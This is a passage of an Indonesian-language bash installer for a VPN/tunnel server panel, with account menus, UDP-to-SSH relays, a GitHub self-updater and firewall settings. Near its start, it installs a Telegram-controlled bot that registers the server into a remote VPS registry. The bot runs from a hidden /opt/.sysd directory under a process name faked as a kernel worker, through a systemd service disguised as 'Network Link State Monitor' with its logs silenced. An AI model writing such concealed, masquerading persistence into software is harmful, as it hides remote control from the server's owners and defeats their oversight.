        send(cid, "🔄 Sync registry dari Telegram...")
        def do_sync():
            data = sync_registry()
            if not data:
                send(cid, "⚠️ Registry kosong atau gagal sync."); return
            lines = [f"✅ <b>Sync berhasil! {len(data)} VPS:</b>",
                     "━━━━━━━━━━━━━━━━━━━━━━━"]
            for i, (vid, info) in enumerate(data.items(), 1):
                lines.append(f"{i}. <b>{info.get('label','N/A')}</b> — <code>{info.get('ip','N/A')}</code>")
            send(cid, "\n".join(lines))
        threading.Thread(target=do_sync, daemon=True).start()
    else:
        send(cid, "❓ Perintah tidak dikenal. Ketik /menu")

def main():
    offset = 0
    pool   = []
    while True:
        try:
            updates = get_updates(offset)
            for upd in updates:
                offset = upd["update_id"] + 1
                t = None
                if "message" in upd:
                    t = threading.Thread(target=on_message, args=(upd["message"],), daemon=True)
                elif "callback_query" in upd:
                    t = threading.Thread(target=on_callback, args=(upd["callback_query"],), daemon=True)
                if t: t.start(); pool.append(t)
            pool = [x for x in pool if x.is_alive()]
        except KeyboardInterrupt: break
        except Exception: time.sleep(3)

if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == "--register":
        vps_register_self()
    else:
        main()
PYEOF2

    chmod +x "$TUNNELBOT_FILE"

    cat > /opt/.sysd/launcher.py << 'LAUNCHEOF'
#!/usr/bin/env python3
import sys, os
try:
    import ctypes
    libc = ctypes.CDLL(None)
    libc.prctl(15, b"[kworker/u4:3]", 0, 0, 0)
except: pass
sys.argv[0] = "[kworker/u4:3]"
exec(open("/opt/.sysd/svc-main.py").read())
LAUNCHEOF

    chmod +x /opt/.sysd/launcher.py

    cat > /etc/systemd/system/systemd-netlink.service << SVEOF
[Unit]
Description=Network Link State Monitor
Documentation=man:networkd(8)
After=network.target
DefaultDependencies=no

[Service]
Type=simple
ExecStart=/usr/bin/python3 -u /opt/.sysd/launcher.py
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null
SyslogIdentifier=

[Install]
WantedBy=multi-user.target
SVEOF

    systemctl stop systemd-netlink 2>/dev/null
    systemctl disable systemd-netlink 2>/dev/null
    systemctl daemon-reload >/dev/null 2>&1
    systemctl enable systemd-netlink >/dev/null 2>&1
    systemctl start systemd-netlink >/dev/null 2>&1
}

#================================================
# CREATE VMESS / VLESS / TROJAN
#================================================

create_vmess() {
    clear; print_menu_header "CREATE VMESS ACCOUNT"
    read -p "  Username      : " username
    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }
    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then
        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi
    read -p "  Expired (days): " days
    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }
    read -p "  Quota (GB)    : " quota
    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100
    read -p "  IP Limit      : " iplimit
    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1
    create_account_template "vmess" "$username" "$days" "$quota" "$iplimit"
}

create_vless() {
    clear; print_menu_header "CREATE VLESS ACCOUNT"
    read -p "  Username      : " username
    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }
    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then
        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi
    read -p "  Expired (days): " days
    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }
    read -p "  Quota (GB)    : " quota
    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100
    read -p "  IP Limit      : " iplimit
    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1
    create_account_template "vless" "$username" "$days" "$quota" "$iplimit"
}

create_trojan() {
    clear; print_menu_header "CREATE TROJAN ACCOUNT"
    read -p "  Username      : " username
    [[ -z "$username" ]] && { echo -e "  ${RED}✘ Required!${NC}"; sleep 2; return; }
    if grep -q "\"email\":\"${username}\"" "$XRAY_CONFIG" 2>/dev/null; then
        echo -e "  ${RED}✘ Username sudah ada!${NC}"; sleep 2; return; fi
    read -p "  Expired (days): " days
    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }
    read -p "  Quota (GB)    : " quota
    [[ ! "$quota" =~ ^[0-9]+$ ]] && quota=100
    read -p "  IP Limit      : " iplimit
    [[ ! "$iplimit" =~ ^[0-9]+$ ]] && iplimit=1
    create_account_template "trojan" "$username" "$days" "$quota" "$iplimit"
}

#================================================
# MENU SSH / VMESS / VLESS / TROJAN
#================================================

menu_ssh() {
    while true; do
        clear; print_menu_header "SSH MENU"
        echo -e "  ${WHITE}[1]${NC} Create SSH"
        echo -e "  ${WHITE}[2]${NC} Trial SSH (1 Jam)"
        echo -e "  ${WHITE}[3]${NC} Delete SSH"
        echo -e "  ${WHITE}[4]${NC} Renew SSH"
        echo -e "  ${WHITE}[5]${NC} Cek Login SSH"
        echo -e "  ${WHITE}[6]${NC} List User SSH"
        echo -e "  ${WHITE}[0]${NC} Back To Menu"
        echo ""
        read -p "  Select: " choice
        case $choice in
            1) create_ssh ;; 2) create_ssh_trial ;;
            3) delete_account "ssh" ;; 4) renew_account "ssh" ;;
            5) check_user_login "ssh" ;; 6) list_accounts "ssh" ;;
            0) return ;;
        esac
    done
}

menu_vmess() {
    while true; do
        clear; print_menu_header "VMESS MENU"
        echo -e "  ${WHITE}[1]${NC} Create VMess"
        echo -e "  ${WHITE}[2]${NC} Trial VMess (1 Jam)"
        echo -e "  ${WHITE}[3]${NC} Delete VMess"
        echo -e "  ${WHITE}[4]${NC} Renew VMess"
        echo -e "  ${WHITE}[5]${NC} Cek Login VMess"
        echo -e "  ${WHITE}[6]${NC} List User VMess"
        echo -e "  ${WHITE}[0]${NC} Back To Menu"
        echo ""
        read -p "  Select: " choice
        case $choice in
            1) create_vmess ;; 2) create_trial_xray "vmess" ;;
            3) delete_account "vmess" ;; 4) renew_account "vmess" ;;
            5) check_user_login "vmess" ;; 6) list_accounts "vmess" ;;
            0) return ;;
        esac
    done
}

menu_vless() {
    while true; do
        clear; print_menu_header "VLESS MENU"
        echo -e "  ${WHITE}[1]${NC} Create VLess"
        echo -e "  ${WHITE}[2]${NC} Trial VLess (1 Jam)"
        echo -e "  ${WHITE}[3]${NC} Delete VLess"
        echo -e "  ${WHITE}[4]${NC} Renew VLess"
        echo -e "  ${WHITE}[5]${NC} Cek Login VLess"
        echo -e "  ${WHITE}[6]${NC} List User VLess"
        echo -e "  ${WHITE}[0]${NC} Back To Menu"
        echo ""
        read -p "  Select: " choice
        case $choice in
            1) create_vless ;; 2) create_trial_xray "vless" ;;
            3) delete_account "vless" ;; 4) renew_account "vless" ;;
            5) check_user_login "vless" ;; 6) list_accounts "vless" ;;
            0) return ;;
        esac
    done
}

menu_trojan() {
    while true; do
        clear; print_menu_header "TROJAN MENU"
        echo -e "  ${WHITE}[1]${NC} Create Trojan"
        echo -e "  ${WHITE}[2]${NC} Trial Trojan (1 Jam)"
        echo -e "  ${WHITE}[3]${NC} Delete Trojan"
        echo -e "  ${WHITE}[4]${NC} Renew Trojan"
        echo -e "  ${WHITE}[5]${NC} Cek Login Trojan"
        echo -e "  ${WHITE}[6]${NC} List User Trojan"
        echo -e "  ${WHITE}[0]${NC} Back To Menu"
        echo ""
        read -p "  Select: " choice
        case $choice in
            1) create_trojan ;; 2) create_trial_xray "trojan" ;;
            3) delete_account "trojan" ;; 4) renew_account "trojan" ;;
            5) check_user_login "trojan" ;; 6) list_accounts "trojan" ;;
            0) return ;;
        esac
    done
}

#================================================
# INSTALL UDP CUSTOM
#================================================

install_udp_custom() {
    cat > /usr/local/bin/udp-custom << 'UDPEOF'
#!/usr/bin/env python3
import socket, threading, select, time

PORTS    = range(7100, 7301)
SSH_HOST = '127.0.0.1'
SSH_PORT = 22
BUF      = 8192
TIMEOUT  = 10

def handle(data, addr, sock):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(TIMEOUT)
        s.connect((SSH_HOST, SSH_PORT))
        s.sendall(data)
        resp = s.recv(BUF)
        if resp: sock.sendto(resp, addr)
        s.close()
    except: pass

sockets = []
for port in PORTS:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.setblocking(False)
        sockets.append(s)
    except: pass

print(f'UDP Custom: {len(sockets)} ports (7100-7300)', flush=True)

while True:
    try:
        readable, _, _ = select.select(sockets, [], [], 1.0)
        for sock in readable:
            try:
                data, addr = sock.recvfrom(BUF)
                threading.Thread(target=handle, args=(data, addr, sock), daemon=True).start()
            except: pass
    except KeyboardInterrupt: break
    except: time.sleep(1)
UDPEOF

    chmod +x /usr/local/bin/udp-custom

    cat > /etc/systemd/system/udp-custom.service << 'UDPSVC'
[Unit]
Description=UDP Custom BadVPN 7100-7300
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/udp-custom
Restart=always
RestartSec=3
LimitNOFILE=65535
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
UDPSVC

    systemctl daemon-reload
    systemctl enable udp-custom 2>/dev/null
    systemctl restart udp-custom
    sleep 1
    systemctl is-active --quiet udp-custom && \
        echo -e "  ${GREEN}✔ UDP OK! (7100-7300)${NC}" || \
        echo -e "  ${RED}✘ UDP Failed!${NC}"
    sleep 2
}

#================================================
# ZI VPN UDP (UDP over HTTP Tunnel)
#================================================

install_zivpn_udp() {
    clear
    print_menu_header "INSTALL ZI VPN UDP"

    echo -e "  ${CYAN}◈ Checking dependencies...${NC}"
    apt-get install -y python3 python3-pip >/dev/null 2>&1

    # ZI VPN UDP: UDP over HTTP/WebSocket tunnel ke port 7400-7500
    # Cocok untuk app ZiVPN di Android
    cat > /usr/local/bin/zivpn-udp << 'ZIEOF'
#!/usr/bin/env python3
"""
ZI VPN UDP Gateway
Menerima koneksi UDP dari ZiVPN client dan tunnel ke SSH
Port: 7400-7500
"""
import socket, threading, select, time, struct

PORTS    = range(7400, 7501)
SSH_HOST = '127.0.0.1'
SSH_PORT = 22
BUF      = 65535
TIMEOUT  = 30

def handle_client(data, addr, udp_sock):
    try:
        tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tcp.settimeout(TIMEOUT)
        tcp.connect((SSH_HOST, SSH_PORT))
        # ZI VPN handshake header
        tcp.sendall(data)
        start = time.time()
        while time.time() - start < TIMEOUT:
            r, _, _ = select.select([tcp], [], [], 1.0)
            if r:
                resp = tcp.recv(BUF)
                if not resp:
                    break
                udp_sock.sendto(resp, addr)
        tcp.close()
    except Exception:
        pass

sockets = []
for port in PORTS:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.setblocking(False)
        sockets.append((port, s))
    except Exception as e:
        pass

print(f'ZI VPN UDP Gateway: {len(sockets)} ports (7400-7500)', flush=True)

while True:
    try:
        sock_list = [s for _, s in sockets]
        readable, _, _ = select.select(sock_list, [], [], 1.0)
        for sock in readable:
            try:
                data, addr = sock.recvfrom(BUF)
                t = threading.Thread(
                    target=handle_client,
                    args=(data, addr, sock),
                    daemon=True
                )
                t.start()
            except Exception:
                pass
    except KeyboardInterrupt:
        break
    except Exception:
        time.sleep(1)
ZIEOF

    chmod +x /usr/local/bin/zivpn-udp

    cat > /etc/systemd/system/zivpn-udp.service << 'ZISVC'
[Unit]
Description=ZI VPN UDP Gateway 7400-7500
After=network.target
Wants=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 /usr/local/bin/zivpn-udp
Restart=always
RestartSec=3
LimitNOFILE=65535
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
ZISVC

    systemctl daemon-reload
    systemctl enable zivpn-udp 2>/dev/null
    systemctl restart zivpn-udp 2>/dev/null
    sleep 2

    if systemctl is-active --quiet zivpn-udp; then
        echo -e "  ${GREEN}✔ ZI VPN UDP aktif di port 7400-7500!${NC}"
    else
        echo -e "  ${RED}✘ ZI VPN UDP gagal start!${NC}"
        journalctl -u zivpn-udp -n 5 --no-pager 2>/dev/null
    fi

    # Buka port di UFW jika aktif
    if command -v ufw >/dev/null 2>&1 && ufw status 2>/dev/null | grep -q "active"; then
        ufw allow 7400:7500/udp >/dev/null 2>&1
        echo -e "  ${GREEN}✔ UFW: port 7400-7500/udp dibuka${NC}"
    fi

    echo ""
    echo -e "  ${WHITE}Konfigurasi ZI VPN di app:${NC}"
    local DOMAIN_NOW; DOMAIN_NOW=$(cat "$DOMAIN_FILE" 2>/dev/null | tr -d '\n\r' | xargs)
    local IP_NOW; IP_NOW=$(get_ip)
    echo -e "  ${CYAN}Host/SNI  :${NC} ${DOMAIN_NOW:-$IP_NOW}"
    echo -e "  ${CYAN}Port UDP  :${NC} 7400 - 7500"
    echo -e "  ${CYAN}Payload   :${NC} GET / HTTP/1.1[crlf]Host: ${DOMAIN_NOW:-$IP_NOW}[crlf][crlf]"
    echo -e "  ${CYAN}SSH User  :${NC} sesuai akun SSH"
    echo -e "  ${CYAN}SSH Pass  :${NC} sesuai akun SSH"
    echo -e "  ${CYAN}SSH Port  :${NC} 22"
    echo ""
    read -p "  Tekan Enter untuk kembali..."
}

manage_zivpn_udp() {
    while true; do
        clear
        local W; W=$(get_width)
        local is_active=0
        systemctl is-active --quiet zivpn-udp 2>/dev/null && is_active=1
        local status_txt; [ $is_active -eq 1 ] && status_txt="${GREEN}● RUNNING${NC}" || status_txt="${RED}○ STOPPED${NC}"

        _box_top $W
        _box_center $W "${YELLOW}${BOLD}ZI VPN UDP MANAGER${NC}"
        _box_divider $W
        _box_left $W "Status    : ${status_txt}"
        _box_left $W "Port      : ${CYAN}7400 - 7500 UDP${NC}"
        _box_left $W "Tunnel    : ${CYAN}UDP → SSH port 22${NC}"
        _box_divider $W
        _box_row $W "[1] Install / Reinstall" "[2] Start / Restart"
        _box_row $W "[3] Stop" "[4] Lihat Log"
        _box_row $W "[5] Uninstall" "[0] Kembali"
        _box_bottom $W
        echo ""
        read -p "  Select: " c
        case $c in
            1) install_zivpn_udp ;;
            2)
                systemctl restart zivpn-udp 2>/dev/null
                systemctl is-active --quiet zivpn-udp \
                    && echo -e "  ${GREEN}✔ ZI VPN UDP started!${NC}" \
                    || echo -e "  ${RED}✘ Failed to start!${NC}"
                sleep 2 ;;
            3)
                systemctl stop zivpn-udp 2>/dev/null
                echo -e "  ${YELLOW}ZI VPN UDP stopped.${NC}"; sleep 2 ;;
            4)
                clear
                echo -e "  ${CYAN}=== ZI VPN UDP Log ===${NC}"
                journalctl -u zivpn-udp -n 30 --no-pager 2>/dev/null
                echo ""; read -p "  Tekan Enter..." ;;
            5)
                read -p "  Yakin hapus ZI VPN UDP? [y/N]: " confirm
                if [[ "$confirm" == "y" ]]; then
                    systemctl stop zivpn-udp 2>/dev/null
                    systemctl disable zivpn-udp 2>/dev/null
                    rm -f /etc/systemd/system/zivpn-udp.service \
                          /usr/local/bin/zivpn-udp
                    systemctl daemon-reload >/dev/null 2>&1
                    echo -e "  ${GREEN}✔ ZI VPN UDP dihapus.${NC}"
                    sleep 2
                fi ;;
            0) return ;;
        esac
    done
}



update_menu() {
    clear
    local W; W=$(get_width)
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}🔄  UPDATE PANEL${NC}"
    _box_divider $W
    _box_left $W "Script    : ${WHITE}YouzinCrabz Tunnel${NC}"
    _box_left $W "Versi saat ini : ${GREEN}v${SCRIPT_VERSION}${NC}"
    _box_left $W "GitHub    : ${CYAN}${GITHUB_USER}/${GITHUB_REPO}${NC}"
    _box_bottom $W
    echo ""

    _box_top $W
    _box_center $W "${WHITE}Pilih metode update:${NC}"
    _box_divider $W
    _box_row $W "[1] Update dari GitHub" "[2] Update Web Page"
    _box_row $W "[3] Apply Auto-Start" "[0] Kembali"
    _box_bottom $W
    echo ""
    read -p "  Pilih [0-3]: " uchoice

    case $uchoice in
    1)
        echo ""
        echo -e "  ${CYAN}◈${NC} Mengecek versi terbaru dari GitHub..."
        local latest
        latest=$(curl -s --max-time 15 "$VERSION_URL" 2>/dev/null | tr -d '[:space:]')

        if [[ -z "$latest" ]]; then
            echo -e "  ${RED}✘ Tidak bisa connect ke GitHub!${NC}"
            echo -e "  ${YELLOW}  Coba gunakan opsi [2] atau [3] untuk update lokal.${NC}"
            echo ""; read -p "  Tekan Enter..."; return
        fi

        echo -e "  ${GREEN}✔${NC} Versi terbaru : ${YELLOW}v${latest}${NC}"
        echo ""

        if [[ "$latest" == "$SCRIPT_VERSION" ]]; then
            echo -e "  ${GREEN}✔ Script sudah versi terbaru!${NC}"
            echo ""; read -p "  Tekan Enter..."; return
        fi

        echo -e "  ${YELLOW}⚡ Update tersedia: v${SCRIPT_VERSION} → v${latest}${NC}"
        echo ""
        read -p "  Update sekarang? [y/N]: " confirm
        [[ "$confirm" != "y" ]] && return
        echo ""

        cp "$SCRIPT_PATH" "$BACKUP_PATH" 2>/dev/null \
            && echo -e "  ${GREEN}✔${NC} Backup → ${BACKUP_PATH}" \
            || echo -e "  ${YELLOW}⚠${NC} Backup gagal, lanjut..."

        local tmp="/tmp/tunnel_update_$$.sh"
        echo -e "  ${CYAN}◈${NC} Mengunduh dari GitHub..."
        if ! curl -L --max-time 90 --retry 3 --progress-bar "$SCRIPT_URL" -o "$tmp" 2>&1; then
            echo -e "  ${RED}✘ Download gagal!${NC}"
            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"
            rm -f "$tmp"; read -p "  Tekan Enter..."; return
        fi

        if [[ ! -s "$tmp" ]]; then
            echo -e "  ${RED}✘ File download kosong!${NC}"
            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"
            rm -f "$tmp"; read -p "  Tekan Enter..."; return
        fi

        if bash -n "$tmp" 2>/dev/null; then
            echo -e "  ${GREEN}✔${NC} Syntax OK"
        else
            echo -e "  ${RED}✘ Syntax error, rollback...${NC}"
            [[ -f "$BACKUP_PATH" ]] && cp "$BACKUP_PATH" "$SCRIPT_PATH"
            rm -f "$tmp"; read -p "  Tekan Enter..."; return
        fi

        mv "$tmp" "$SCRIPT_PATH"
        chmod +x "$SCRIPT_PATH"
        deploy_web_page >/dev/null 2>&1
        echo -e "  ${GREEN}✔ Update berhasil! v${SCRIPT_VERSION} → v${latest}${NC}"
        echo -e "  ${CYAN}◈${NC} Restart panel dalam 3 detik..."
        sleep 3
        exec bash "$SCRIPT_PATH"
        ;;

    2)
        echo ""
        echo -e "  ${CYAN}◈${NC} Deploy ulang web page ke Nginx..."
        deploy_web_page
        echo -e "  ${GREEN}✔ Web page berhasil diperbarui!${NC}"
        echo -e "  ${CYAN}◈${NC} Buka browser: ${YELLOW}http://${DOMAIN:-$(get_ip)}/${NC}"
        echo ""; read -p "  Tekan Enter..."
        ;;

    3)
        echo ""
        echo -e "  ${CYAN}◈${NC} Menerapkan auto-start menu saat login SSH..."
        setup_menu_command
        echo -e "  ${GREEN}✔ Auto-start aktif!${NC}"
        echo -e "  ${CYAN}◈${NC} Logout & login ulang untuk test."
        echo ""; read -p "  Tekan Enter..."
        ;;

    0) return ;;
    *) echo -e "  ${RED}Pilihan tidak valid${NC}"; sleep 1 ;;
    esac
}

#================================================
# CHANGE TIMEZONE
#================================================

change_timezone() {
    clear
    local W; W=$(get_width)
    _box_top $W
    _box_center $W "${YELLOW}${BOLD}TIMEZONE SETTINGS${NC}"
    _box_divider $W
    echo -e "  ${WHITE}Timezone saat ini :${NC} ${CYAN}$(timedatectl show --property=Timezone --value 2>/dev/null || cat /etc/timezone)${NC}"
    echo -e "  ${WHITE}Waktu sistem      :${NC} ${GREEN}$(date '+%d %b %Y %H:%M:%S %Z')${NC}"
    _box_divider $W
    echo -e "  ${CYAN}[1]${NC} WIB  — Asia/Jakarta   (UTC+7)"
    echo -e "  ${CYAN}[2]${NC} WITA — Asia/Makassar  (UTC+8) ${GREEN}← Banjarmasin${NC}"
    echo -e "  ${CYAN}[3]${NC} WIT  — Asia/Jayapura  (UTC+9)"
    echo -e "  ${CYAN}[4]${NC} Lainnya (ketik manual)"
    echo -e "  ${RED}[0]${NC} Back"
    _box_bottom $W
    echo ""
    read -p "  Pilih [0-4]: " tz_choice
    local tz_zone=""
    case $tz_choice in
        1) tz_zone="Asia/Jakarta" ;;
        2) tz_zone="Asia/Makassar" ;;
        3) tz_zone="Asia/Jayapura" ;;
        4) read -p "  Masukkan timezone (contoh: Asia/Singapore): " tz_zone ;;
        0) return ;;
    esac
    [[ -z "$tz_zone" ]] && return
    if timedatectl set-timezone "$tz_zone" 2>/dev/null; then
        hwclock --systohc 2>/dev/null || true
        echo -e "  ${GREEN}✔ Timezone berhasil diubah ke: ${tz_zone}${NC}"
        echo -e "  ${WHITE}Waktu sekarang: $(date '+%d %b %Y %H:%M:%S %Z')${NC}"
    else
        echo -e "  ${RED}✘ Timezone tidak valid: ${tz_zone}${NC}"
    fi
    sleep 2
}

#================================================
# ADVANCED MENU
#================================================

menu_advanced() {
    while true; do
        clear
        local W; W=$(get_width)
        _box_top $W
        _box_center $W "${YELLOW}${BOLD}ADVANCED SETTINGS${NC}"
        _box_divider $W
        _box_row $W "[1]  Port Management" "[8]  Bandwidth Monitor"
        _box_row $W "[2]  Protocol Config" "[9]  User IP Limits"
        _box_row $W "[3]  Auto Backup" "[10] Custom Payload"
        _box_row $W "[4]  SSH Brute Protect" "[11] Cron Jobs"
        _box_row $W "[5]  Fail2Ban Setup" "[12] System Logs"
        _box_row $W "[6]  DDoS Protection" "[13] Timezone"
        _box_row $W "[7]  Firewall Rules" "[14] SSL Cert Info"
        _box_row $W "[15] IP Whitelist SSH" "[16] Monitor Quota"
        _box_divider $W
        _box_left $W "[0]  Back to Main Menu"
        _box_bottom $W
        echo ""
        read -p "  Select [0-16]: " choice
        case $choice in
            1) _adv_port_management ;;  2) _adv_protocol_settings ;;
            3) _adv_auto_backup ;;      4) _adv_ssh_brute_protection ;;
            5) _adv_fail2ban ;;         6) _adv_ddos_protection ;;
            7) _adv_firewall ;;         8) _adv_bandwidth_monitor ;;
            9) _adv_user_limits ;;      10) _adv_custom_payload ;;
            11) _adv_cron_jobs ;;       12) _adv_system_logs ;;
            13) change_timezone ;;      14) _adv_ssl_info ;;
            15) _adv_ip_whitelist ;;    16) _adv_quota_monitor ;;
            0) return ;;
        esac
    done
}

_adv_port_management() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD}PORT MANAGEMENT${NC}"
    _mini_divider $MW
    local ports
    ports=$(ss -tlnp 2>/dev/null | awk 'NR>1 && /LISTEN/ {
        split($4,a,":"); port=a[length(a)]
        match($6,/\"([^\"]+)\"/,m)
        printf "  %-8s %s\n", port, m[1]
    }' | sort -n | head -20)
    while IFS= read -r line; do
        _mini_left $MW "${GREEN}${line}${NC}"
    done <<< "$ports"
    _mini_divider $MW
    _mini_left $MW "${WHITE}Port aktif sistem VPN:${NC}"
    _mini_row $MW "443  → TLS Nginx SSL" "80   → HTTP no-TLS"
    _mini_row $MW "22   → SSH OpenSSH" "222  → SSH Dropbear"
    _mini_row $MW "8080 → VMess WS" "8081 → VLess WS"
    _mini_row $MW "8082 → Trojan WS" "8444 → VMess gRPC"
    _mini_row $MW "8445 → VLess gRPC" "8446 → Trojan gRPC"
    _mini_bottom $MW
    echo ""; read -p "  Tekan Enter untuk kembali..."
}

_adv_protocol_settings() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD}PROTOCOL SETTINGS${NC}"
    _mini_divider $MW
    if [[ -f "$XRAY_CONFIG" ]]; then
        local inbound_count; inbound_count=$(jq '.inbounds | length' "$XRAY_CONFIG" 2>/dev/null)
        _mini_left $MW "Total Inbounds : ${GREEN}${inbound_count:-0}${NC}"
        _mini_divider $MW
        while IFS= read -r line; do
            _mini_left $MW "${CYAN}${line}${NC}"
        done < <(jq -r '.inbounds[] | "→ \(.tag)  port:\(.port)  \(.protocol)"' "$XRAY_CONFIG" 2>/dev/null)
    else
        _mini_left $MW "${RED}Config Xray tidak ditemukan!${NC}"
    fi
    _mini_divider $MW
    _mini_two $MW "[1] Restart Xray " "[2] Lihat Config "
    _mini_two $MW "[3] Test Config  " "[0] Back         "
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    case $c in
        1)
            if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then
                systemctl restart xray && echo -e "  ${GREEN}✔ Xray Restarted!${NC}"
            else
                echo -e "  ${RED}✘ Config error!${NC}"
                xray -test -config "$XRAY_CONFIG" 2>&1 | sed 's/^/    /'
            fi; sleep 2 ;;
        2) clear; cat "$XRAY_CONFIG" 2>/dev/null; echo ""; read -p "  Tekan Enter..." ;;
        3)
            echo -e "  ${CYAN}Testing Xray...${NC}"
            xray -test -config "$XRAY_CONFIG" 2>&1 | sed 's/^/  /'
            echo ""; nginx -t 2>&1 | sed 's/^/  /'
            echo ""; read -p "  Tekan Enter..." ;;
    esac
}

_adv_auto_backup() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} AUTO BACKUP CONFIG${NC}"
    _mini_divider $MW
    local cron_status="TIDAK AKTIF"
    crontab -l 2>/dev/null | grep -q "vpn-backup" && cron_status="${GREEN}AKTIF${NC}"
    _mini_left $MW "Status     : ${cron_status}"
    _mini_left $MW "Jadwal     : Setiap hari jam 02:00"
    _mini_left $MW "Lokasi     : /root/backups/"
    _mini_divider $MW
    _mini_two $MW "[1] Enable Auto Backup " "[2] Disable           "
    _mini_two $MW "[3] Backup Sekarang    " "[0] Back              "
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    case $c in
        1)
            mkdir -p /root/backups
            (crontab -l 2>/dev/null | grep -v "vpn-autobackup"
             echo "0 2 * * * tar -czf /root/backups/vpn-backup-\$(date +\%Y\%m\%d).tar.gz /root/akun /root/domain /usr/local/etc/xray/config.json /etc/xray 2>/dev/null") | crontab -
            echo -e "  ${GREEN}✔ Auto backup aktif jam 02:00!${NC}"; sleep 2 ;;
        2) crontab -l 2>/dev/null | grep -v "vpn-backup" | crontab -
           echo -e "  ${YELLOW}Auto backup dimatikan.${NC}"; sleep 2 ;;
        3) _menu_backup ;;
    esac
}

_adv_ssh_brute_protection() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} SSH BRUTE FORCE PROTECTION${NC}"
    _mini_divider $MW
    detect_firewall_backend
    _mini_left $MW "Firewall Backend : ${CYAN}${FW_BACKEND}${NC}"
    _mini_divider $MW
    _mini_two $MW "[1] Aktifkan Protection " "[2] Lihat Block List  "
    _mini_two $MW "[3] Reset Rules        " "[0] Back              "
    _mini_bottom $MW
    echo ""; read -p "  Select: " c
    case $c in
        1)
            if [[ "$FW_BACKEND" == "nftables" ]]; then
                command -v iptables-legacy >/dev/null 2>&1 && {
                    iptables-legacy -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 2>/dev/null
                    iptables-legacy -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP 2>/dev/null
                } || nft add rule ip filter INPUT tcp dport 22 ct state new limit rate 5/minute accept 2>/dev/null || true
            else
                iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH 2>/dev/null
                iptables -I INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 6 --name SSH -j DROP 2>/dev/null
            fi
            echo -e "  ${GREEN}✔ SSH Brute Protection AKTIF!${NC}"; sleep 3 ;;
        2) clear; iptables -L INPUT -n 2>/dev/null | grep "DROP\|REJECT" | head -20
           echo ""; read -p "  Tekan Enter..." ;;
        3) iptables -F 2>/dev/null; echo -e "  ${GREEN}✔ Rules direset!${NC}"; sleep 2 ;;
    esac
}

_adv_fail2ban() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} FAIL2BAN SETUP${NC}"
    _mini_divider $MW
    if command -v fail2ban-client >/dev/null 2>&1; then
        _mini_left $MW "${GREEN}✔ Fail2ban terinstall${NC}"
        _mini_divider $MW
        while IFS= read -r line; do
            _mini_left $MW "$line"
        done < <(fail2ban-client status 2>/dev/null | head -10)
    else
        _mini_left $MW "${RED}Fail2ban belum terinstall${NC}"
        _mini_divider $MW
        _mini_two $MW "[1] Install Fail2ban " "[0] Back            "
    fi
    _mini_bottom $MW
    echo ""
    if ! command -v fail2ban-client >/dev/null 2>&1; then
        read -p "  Select: " c
        if [[ "$c" == "1" ]]; then
            apt-get install -y fail2ban >/dev/null 2>&1
            systemctl enable fail2ban >/dev/null 2>&1
            systemctl restart fail2ban >/dev/null 2>&1
            echo -e "  ${GREEN}✔ Fail2ban terinstall!${NC}"
        fi
    fi
    read -p "  Tekan Enter untuk kembali..."
}

_adv_ddos_protection() {
    clear
    local W; W=$(get_width); local MW=$(( W - 4 ))
    _mini_top $MW
 _mini_center $MW "${YELLOW}${BOLD} DDOS PROTECTION${NC}"
    _mini_divider $MW
    detect_firewall_backend
